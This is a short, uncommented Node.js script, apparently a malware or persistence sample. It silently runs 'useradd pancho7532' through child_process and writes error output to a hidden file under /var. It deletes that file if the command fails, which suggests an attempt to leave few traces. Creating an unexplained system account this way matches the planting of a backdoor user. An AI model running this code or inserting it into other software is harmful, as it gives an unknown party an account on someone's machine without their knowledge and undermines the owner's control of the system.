var cproc = require('child_process');
var fs = require('fs');
var ws = fs.createWriteStream("/var/.tmpjs1");
var util = require('util');
try {
	cproc.execSync("useradd pancho7532", {stdio: [null, null, ws]});
} catch(error) {
console.log("error was: " + util.inspect(ws));
fs.unlinkSync("/var/.tmpjs1");
}

